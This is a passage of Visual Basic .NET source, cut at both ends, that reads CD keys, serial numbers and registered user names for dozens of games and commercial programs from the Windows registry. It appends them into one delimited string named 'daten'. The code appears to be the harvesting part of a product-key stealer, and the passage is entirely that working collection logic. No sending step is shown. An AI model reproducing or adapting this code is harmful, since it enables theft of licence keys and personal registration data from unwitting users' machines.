            daten = daten & "CD-/Serialkey;:;" & "Empire Earth II;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Sierra\Empire Earth II", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Sierra\CDKey", "fear", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "f.e.a.r ;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Sierra\CDKey", "fear", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\F-Secure\BackWeb\iLauncher", "UID", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "F-Secure;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\F-Secure\BackWeb\iLauncher", "UID", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\CRYTEK\FARCRY\UBI.COM", "CDKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "FARCRY;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\CRYTEK\FARCRY\UBI.COM", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\CRYTEK\FARCRY2\UBI.COM", "CDKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "FARCRY;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\CRYTEK\FARCRY2\UBI.COM", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2002", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "FIFA 2002;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2002", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2003", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "FIFA 2003;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2003", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2004", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "FIFA 2004;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2004", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2005", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "FIFA 2005;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 2005", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 07", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "FIFA 07;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\FIFA 07", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\FIFA 08", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "FIFA 08;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\FIFA 08", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Distribution\Freedom Force", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Freedom Force;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Distribution\Freedom Force", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Frontlines: Fuel of War Beta", "ProductKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Fuel of War Beta;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Frontlines: Fuel of War Beta", "ProductKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Frontlines: Fuel of War", "ProductKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Fuel of War;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\THQ\Frontlines: Fuel of War", "ProductKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Headlight\GetRight", "GRcode", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "GetRight;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Headlight\GetRight", "GRcode", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Global Operations", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Global Operations;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Global Operations", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Gunman", "Settings", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Gunman;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Gunman", "Settings", Nothing) & ";:;;:;~+~"
        End If

        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Half-Life\Setting", "Key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Half-Life;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Half-Life\Setting", "Key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Hellgate: London", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Hellgate: London;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Hellgate: London", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Illusion Softworks\Hidden & Dangerous 2", "key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Hidden & Dangerous 2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Illusion Softworks\Hidden & Dangerous 2", "key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\IGI 2 Retail\CDKey", "CDkey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "IGI 2 Retail;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\IGI 2 Retail\CDKey", "CDkey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\InCD", "License", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "InCD;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\InCD", "License", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\InCD", "UserName", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "InCD;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\InCD", "UserName", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\JoWooD\InstalledGames\IG2", "prvkey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "IG2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\JoWooD\InstalledGames\IG2", "prvkey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\AVConverter\iPod Converter", "Registration Code", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "iPod Converter;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\AVConverter\iPod Converter", "Registration Code", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\AVConverter\iPod Converter", "User Name", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "iPod Converter;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\AVConverter\iPod Converter", "User Name", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\James Bond 007 Nightfire", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "James Bond 007 Nightfire;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\James Bond 007 Nightfire", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\3d0\Status Legends of Might and Magic", "CustomerNumber", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Status Legends of Might and Magic;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\3d0\Status Legends of Might and Magic", "CustomerNumber", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Flash\7\Registration", "Serial Number", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Macromedia\Flash\7;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Flash\7\Registration", "Serial Number", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Fireworks\7\Registration", "Serial Number", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Macromedia\Fireworks\7;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Fireworks\7\Registration", "Serial Number", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Dreamweaver\7\Registration", "Serial Number", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Macromedia\Dreamweaver\7;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Macromedia\Dreamweaver\7\Registration", "Serial Number", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Madden NFL 07", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Madden NFL 07;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Madden NFL 07", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\JSG\Matrix Saver V2", "Registration", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Matrix Saver V2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\JSG\Matrix Saver V2", "Registration", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Medal of Honor Airborne", "Product GUID", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Medal of Honor Airborne;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Medal of Honor Airborne", "Product GUID", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Medal of Honor Allied Assault;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault Breakthrough", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Medal of Honor Allied Assault Breakthrough;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault Breakthrough", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault Spearhead", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Medal of Honor Allied Assault Spearhead;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault Spearhead", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Medal of Honor: Heroes 2", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Medal of Honor: Heroes 2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Medal of Honor: Heroes 2", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\mIRC", "UserName", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "mIRC;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\mIRC", "UserName", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\mIRC", "License", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "mIRC;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\mIRC", "License", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Nascar Racing 2002", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Nascar Racing 2002;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Nascar Racing 2002", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Nascar Racing 2003", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Nascar Racing 2003;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\Nascar Racing 2003", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2002", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NHL 2002;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2002", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 2003", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NBA LIVE 2003;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 2003", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 2004", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NBA LIVE 2004;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 2004", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 07", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NBA LIVE 07;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA LIVE 07", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA Live 08", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NBA Live 08;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NBA Live 08", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed Carbon", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Need for Speed Carbon;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed Carbon", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need For Speed Hot Pursuit 2", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Need For Speed Hot Pursuit 2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need For Speed Hot Pursuit 2", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need for Speed Most Wanted", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Need for Speed Most Wanted;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need for Speed Most Wanted", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed ProStreet", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Need for Speed ProStreet;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\Electronic Arts\Need for Speed ProStreet", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need For Speed Underground", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Need For Speed Underground;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Need For Speed Underground", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Need for Speed Underground 2", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Need for Speed Underground 2;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Games\Need for Speed Underground 2", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\Nero - Burning Rom\Info", "Serial6", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Nero - Burning Rom;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Ahead\Nero - Burning Rom\Info", "Serial6", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Nero\Installation\Families\Nero 7\Info", "Serial7_1191197813", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Nero 7;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Nero\Installation\Families\Nero 7\Info", "Serial7_1191197813", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Nero\Installation\Families\Nero 8\Info", "Serial8_1194709660", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Nero 8;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Nero\Installation\Families\Nero 8\Info", "Serial8_1194709660", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2002", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NHL 2002;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2002", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2003", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NHL 2003;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2003", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2004", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NHL 2004;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2004", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2005", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "NHL 2005;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA Sports\NHL 2005", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Westwood\Nox", "Serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Westwood\Nox;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Westwood\Nox", "Serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\NuMega\SmartCheck", "Serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Numega SmartCheck;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\NuMega\SmartCheck", "Serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\OnlineTVPlayer\RegInfo", "name", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "OnlineTVPlayer;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\OnlineTVPlayer\RegInfo", "name", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\OnlineTVPlayer\RegInfo", "serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "OnlineTVPlayer;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\OnlineTVPlayer\RegInfo", "serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "User", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "O&O Defrag\8.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "User", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "Company", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "O&O Defrag\8.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "Company", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "SerialNo", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "O&O Defrag\8.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\O&O\O&O Defrag\8.0\Pro\licenses", "SerialNo", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\PowerQuest\PartitionMagic\8.0\UserInfo", "SerialNumber", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "PartitionMagic\8.0;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\PowerQuest\PartitionMagic\8.0\UserInfo", "SerialNumber", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "Name", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Passware Encryption Analyzer;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "Name", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "SerialNumber", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Passware Encryption Analyzer;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "SerialNumber", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "Serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Passware Encryption Analyzer;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Encryption Analyzer\1\Registration,License", "Serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Windows Key\7\Registration", "Name", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Passware\Windows Key;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Windows Key\7\Registration", "Name", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Windows Key\7\Registration", "Serial", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Passware\Windows;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Passware\Windows Key\7\Registration", "Serial", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\CyberLink\PowerDVD", "UI_RMK", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "PowerDVD;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\CyberLink\PowerDVD", "UI_RMK", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\EnTech\PowerStrip", "Key", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "PowerStrip;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\EnTech\PowerStrip", "Key", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\KONAMI\PES2008", "code", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Pro Evolution Soccer 2008;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\KONAMI\PES2008", "code", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Red Storm Entertainment\RAVENSHIELD", "CDKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Rainbow Six III RavenShield;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Red Storm Entertainment\RAVENSHIELD", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Shogun Total War - Warlord Edition", "ergc", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Shogun Total War - Warlord Edition;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Shogun Total War - Warlord Edition", "ergc", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Atari\Sid Meier's Pirates!", "CDKey", Nothing) <> "" Then
            daten = daten & "CD-/Serialkey;:;" & "Sid Meier's Pirates!;:;" & Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Atari\Sid Meier's Pirates!", "CDKey", Nothing) & ";:;;:;~+~"
        End If
        If Registry.GetValue("HKEY_LOCAL_MACHINE\Software\Ubisoft\SILENT HUNTER III\Keys", "DiscKey_SH3", Nothing) <> "" Then
